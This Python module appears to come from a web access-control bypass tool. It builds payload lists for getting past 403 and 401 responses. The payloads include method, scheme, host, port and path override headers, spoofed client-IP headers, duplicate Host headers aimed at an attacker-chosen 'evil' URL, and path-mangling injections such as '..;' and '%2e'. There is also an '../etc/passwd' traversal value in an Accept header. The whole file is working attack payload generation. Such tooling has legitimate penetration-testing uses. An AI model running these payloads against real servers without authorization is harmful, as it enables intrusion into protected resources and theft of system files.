#!/usr/bin/env python3

from .       import array, encode, path, url
from .cookie import format_key_value as format_cookie
from .header import format_key_value as format_header

import copy

# ----------------------------------------

def get_file_upload_urls(inaccessible_url: url.URL, filename: str):
	"""
	Get a list of file upload URLs recursively for each directory in the URL path with and without the specified filename.\n
	Returns a unique list.
	"""
	tmp = []
	for url in path.join_multiple(inaccessible_url.domain.scheme_domain_port, path.get_recursive(inaccessible_url.path.path_no_parameters)):
		for __url in [path.join(url, filename), url]:
			tmp.append(__url + inaccessible_url.query_string.string + inaccessible_url.fragment.string)
	return array.unique(tmp)

# ----------------------------------------

def get_method_override_urls(inaccessible_url: url.URL, methods: list[str]):
	"""
	Get a list of method override URLs.\n
	Returns a unique list.
	"""
	tmp = []
	parameters = [
		"_method",
		"x-http-method-override",
		"x-method-override",
		"X-HTTP-Method-Override",
		"X-Method-Override"
	]
	for parameter in parameters:
		copied = copy.deepcopy(inaccessible_url)
		for method in methods:
			if parameter in copied.query_string.parsed:
				copied.query_string.parsed[parameter][-1] = method
			else:
				copied.query_string.parsed[parameter] = [method]
			tmp.append(copied.domain.scheme_domain_port + copied.path.path_no_parameters + f"?{url.urlencode(copied.query_string.parsed)}" + copied.fragment.string)
	return array.unique(tmp)

def get_method_override_headers(methods: list[str]):
	"""
	Get a list of method override HTTP request headers.\n
	Returns a unique list.
	"""
	tmp = []
	headers = [
		"X-HTTP-Method",
		"X-HTTP-Method-Override",
		"X-Method",
		"X-Method-Override"
	]
	for header in headers:
		for method in methods:
			tmp.append(format_header(header, method))
	return array.unique(tmp)

def get_method_override_bodies(methods: list[str]):
	"""
	Get a list of method override HTTP request bodies in the 'key=value' format.\n
	For example, use the bodies with the HTTP POST method and the 'Content-Type: application/x-www-form-urlencoded' HTTP request header.\n
	Returns a unique list.
	"""
	tmp = []
	parameters = [
		"_method"
	]
	for parameter in parameters:
		for method in methods:
			tmp.append(format_cookie(parameter, method))
	return array.unique(tmp)

# ----------------------------------------

def get_scheme_override_headers(scheme: url.Scheme):
	"""
	Get a list of scheme override HTTP request headers.\n
	Returns a unique list.
	"""
	tmp = []
	# ------------------------------------
	headers = [
		"X-Forwarded-Protocol",
		"X-Forwarded-Proto",
		"X-Forwarded-Scheme",
		"X-URL-Scheme",
		"X-Scheme"
	]
	for header in headers:
		tmp.append(format_header(header, scheme.value))
	# ------------------------------------
	headers = [
		"X-Forwarded-SSL",
		"Front-End-HTTPS"
	]
	for header in headers:
		tmp.append(format_header(header, url.Scheme.get_ssl_status(scheme.value)))
	# ------------------------------------
	return array.unique(tmp)

# ----------------------------------------

def get_port_override_headers(ports: list[int]):
	"""
	Get a list of port override HTTP request headers.\n
	Returns a unique list.
	"""
	tmp = []
	headers = [
		"X-Forwarded-Port"
	]
	for header in headers:
		for port in ports:
			tmp.append(format_header(header, port))
	return array.unique(tmp)

# ----------------------------------------

def get_host_override_headers(hosts: list[str]):
	"""
	Get a list of host override HTTP request headers.\n
	Returns a unique list.
	"""
	tmp = []
	headers = [
		"X-Forwarded-Host",
		"X-HTTP-Host-Override",
		"X-Host-Override",
		"X-Host",
		"Host"
	]
	for header in headers:
		for host in hosts:
			tmp.append(format_header(header, host))
	return array.unique(tmp)

def get_two_host_headers(inaccessible_url: url.URL, evil_url: url.URL) -> list[list[str]]:
	"""
	Get a list of HTTP request headers where each element contains two 'Host' HTTP request headers.\n
	Returns a unique list.
	"""
	tmp = []
	for evil in evil_url.domain.domains + evil_url.ip.ips:
		for initial in inaccessible_url.domain.domains + inaccessible_url.ip.ips:
			tmp.append([
				f"Host: {initial}",
				f"Host: {evil}"
			])
	return tmp

# ----------------------------------------

def get_path_override_headers(paths: list[str]):
	"""
	Get a list of URL path override HTTP request headers.\n
	Returns a unique list.
	"""
	tmp = []
	headers = [
		"X-Forwarded-Path",
		"X-Original-URL",
		"X-Override-URL",
		"X-Rewrite-URL"
	]
	for header in headers:
		for path in paths:
			tmp.append(format_header(header, path))
	return array.unique(tmp)

# ----------------------------------------

def get_ip_headers(ips: list[str]):
	"""
	Get a list of HTTP request headers that accept IP addresses.\n
	Returns a unique list.
	"""
	tmp = []
	# ------------------------------------
	headers = [
		"CF-Connecting-IP",
		"X-Originating-IP",
		"X-ProxyUser-IP",
		"X-Real-IP",
		"X-Remote-IP",
		"X-Server-IP",
		"X-True-IP",
		"Client-IP",
		"X-Client-IP",
		"Cluster-Client-IP",
		"X-Cluster-Client-IP",
		"True-Client-IP",
		"X-True-Client-IP",
		"Proxy-Client-IP",
		"WL-Proxy-Client-IP",
		"Incap-Client-IP",
		"X-Forward",
		"X-Forward-For",
		"X-Forwarded",
		"X-Forwarded-By",
		"Forwarded-For",
		"X-Forwarded-For",
		"Forwarded-For-IP",
		"X-Forwarded-For-IP",
		"X-Forwarded-For-Original",
		"X-Original-Forwarded-For",
		"X-Originally-Forwarded-For",
		"Remote-Addr",
		"X-Remote-Addr",
		"X-Original-Remote-Addr"
	]
	for header in headers:
		for ip in ips:
			tmp.append(format_header(header, ip))
	# ------------------------------------
	for ip in ips:
		for __ip in [ip, f"for={ip}", f"by={ip}"]:
			tmp.append(format_header("Forwarded", __ip))
	# ------------------------------------
	for ip in ips:
		for injection in ["", ";", ".;", "..;"]:
			tmp.append(format_header("X-Custom-IP-Authorization", ip + injection))
	# ------------------------------------
	return array.unique(tmp)

def get_multi_ip_headers(ips: list[str]):
	"""
	Get a list of HTTP request headers that accept comma-separated IP addresses.\n
	Returns a unique list.
	"""
	tmp = []
	headers = [
		"X-Forward",
		"X-Forward-For",
		"Forwarded",
		"X-Forwarded",
		"X-Forwarded-By",
		"Forwarded-For",
		"X-Forwarded-For",
		"Forwarded-For-IP",
		"X-Forwarded-For-IP",
		"X-Forwarded-For-Original",
		"X-Original-Forwarded-For",
		"X-Originally-Forwarded-For"
	]
	for header in headers:
		for ip in ips:
			tmp.append(format_header(header, ip))
	return array.unique(tmp)

def get_host_headers(hosts: list[str]):
	"""
	Get a list of HTTP request headers that accept IP addresses and domain names.\n
	Returns a unique list.
	"""
	tmp = []
	headers = [
		"X-Forwarded-Server",
		"X-Proxy-Host",
		"Proxy",
		"Redirect"
	]
	for header in headers:
		for host in hosts:
			tmp.append(format_header(header, host))
	return array.unique(tmp)

def get_root_url_headers(urls: list[str]):
	"""
	Get a list of HTTP request headers that accept root URLs.\n
	Returns a unique list.
	"""
	tmp = []
	headers = [
		"X-Referer",
		"Referer",
		"Origin"
	]
	for header in headers:
		for url in urls:
			tmp.append(format_header(header, url))
	return array.unique(tmp)

def get_full_url_headers(urls: list[str]):
	"""
	Get a list of HTTP request headers that accept full URLs.\n
	Returns a unique list.
	"""
	tmp = []
	headers = [
		"X-Referer",
		"Referer",
		"X-Proxy-URL",
		"Proxy",
		"X-HTTP-DestinationURL",
		"Destination",
		"Redirect",
		"Request-URI",
		"URI",
		"Base-URL",
		"URL",
		"X-WAP-Profile",
		"WAP-Profile",
		"19-Profile",
		"Profile"
	]
	for header in headers:
		for url in urls:
			tmp.append(format_header(header, url))
	return array.unique(tmp)

def get_special_headers(inaccessible_url: url.URL, evil_url: url.URL):
	"""
	Get a list of HTTP request headers that accept special values.\n
	Returns a unique list.
	"""
	tmp = [
		format_header("X-Requested-With", "XMLHttpRequest"                                  ),
		format_header("X-WAP-Profile"   , "http://wap.samsungmobile.com/uaprof/SGH-I777.xml"),
		format_header("WAP-Profile"     , "http://wap.samsungmobile.com/uaprof/SGH-I777.xml"),
		format_header("19-Profile"      , "http://wap.samsungmobile.com/uaprof/SGH-I777.xml"),
		format_header("Accept"          , "application/json,text/javascript,*/*;q=0.01"     ),
		format_header("Accept"          , "../../../../../../../../../../etc/passwd{{"      )
	]
	# ------------------------------------
	for url in [inaccessible_url, evil_url]:
		for root_url in url.domain.scheme_domains:
			tmp.append(format_header("Profile", f"<{root_url}{url.path.path_no_parameters}>"))
		if not url.is_ip():
			tmp.append(format_header("From", f"root@{url.domain.domain}"))
	# ------------------------------------
	return array.unique(tmp)

# ----------------------------------------

def get_path_bypass_urls(inaccessible_url: url.URL, battering_ram = False):
	"""
	Get a list of path bypass URLs.\n
	Returns a unique list.
	"""
	bypasses = []
	directory = inaccessible_url.path.path_no_parameters.strip(path.SEP)
	# ------------------------------------
	# NOTE: Inject characters at the beginning, at the end, and at both the beginning and the end of the URL path.
	# NOTE: Test using every possible combination of the payload set (default: cluster bomb) or insert the same payload into all defined payload positions simultaneously (battering ram).
	injections = []
	for injection in ["", "%09", "%20", "%23", "%2e", "%a0", "*", ".", "..", ";", ".;", "..;", ";foo=bar;", "/;/", ";/../../"]:
		injections.extend([path.SEP + injection + path.SEP, path.SEP + injection, injection + path.SEP, injection])
	# -- -- -- -- -- -- -- -- -- -- -- ---
	for injection in injections:
		bypasses.extend([injection + directory, directory + injection])
		if directory:
			if battering_ram:
				bypasses.extend([injection + directory + injection])
			else:
				for __injection in injections:
					bypasses.extend([injection + directory + __injection])
	# ------------------------------------
	# NOTE: Inject characters at the beginning of the URL path.
	injections = ["/notfound/../"]
	# -- -- -- -- -- -- -- -- -- -- -- ---
	for injection in injections:
		bypasses.extend([injection + directory])
	# ------------------------------------
	# NOTE: Inject characters at the end of the URL path.
	injections = ["[.].*"]
	# -- -- -- -- -- -- -- -- -- -- -- ---
	for injection in injections:
		bypasses.extend([directory + injection])
	# ------------------------------------
	# NOTE: Inject characters at the end of the URL path.
	injections = []
	for injection in ["#", "*", ".", "?", "~"]:
		injections.extend([injection, injection + injection, f"{injection}random"])
	# -- -- -- -- -- -- -- -- -- -- -- ---
	for injection in injections:
		bypasses.extend([directory + injection, directory + path.SEP + injection])
	# ------------------------------------
	# NOTE: Inject file extensions at the end of the URL path only if it does not end with a forward slash.
	if directory and not inaccessible_url.path.path_no_parameters.endswith(path.SEP):
		injections = ["asp", "aspx", "esp", "html", "jhtml", "json", "jsp", "jspa", "jspx", "php", "sht", "shtml", "xhtml", "xml"]
		# -- -- -- -- -- -- -- -- -- -- --
		for injection in injections:
			bypasses.extend([f"{directory}.{injection}"])
	# ------------------------------------
	tmp = []
	for bypass in bypasses:
		if bypass:
			tmp.append(inaccessible_url.domain.scheme_domain_port + path.prepend_slash(bypass) + inaccessible_url.query_string.string + inaccessible_url.fragment.string)
	# ------------------------------------
	return array.unique(tmp)

# ----------------------------------------

def get_encoded_urls(inaccessible_url: url.URL):
	"""
	Get a list of transformed and encoded URLs.\n
	Returns a unique list.
	"""
	tmp = []
	hosts = encode.transform_host(inaccessible_url.domain.domain)
	paths = encode.transform_path(inaccessible_url.path.path_no_parameters) if inaccessible_url.path.path_no_parameters else []
	for host in hosts:
		tmp.append(f"{inaccessible_url.scheme}://{host}:{inaccessible_url.port}{inaccessible_url.path.path}")
		for path in paths:
			tmp.append(f"{inaccessible_url.scheme}://{host}:{inaccessible_url.port}{path}{inaccessible_url.query_string.string}{inaccessible_url.fragment.string}")
	return array.unique(tmp)

# ----------------------------------------

def get_basic_auth_headers(credentials: list[str]):
	"""
	Get a list of basic authorization HTTP request headers.\n
	Returns a unique list.
	"""
	tmp = []
	headers = [
		"Authorization"
	]
	for header in headers:
		for credential in credentials:
			tmp.append(format_header(header, f"Basic {credential}"))
	return array.unique(tmp)

# ----------------------------------------

def get_bearer_auth_headers(jwts: list[str]):
	"""
	Get a list of bearer authorization HTTP request headers.\n
	Returns a unique list.
	"""
	tmp = []
	headers = [
		"Authorization"
	]
	for header in headers:
		for jwt in jwts:
			tmp.append(format_header(header, f"Bearer {jwt}"))
	return array.unique(tmp)
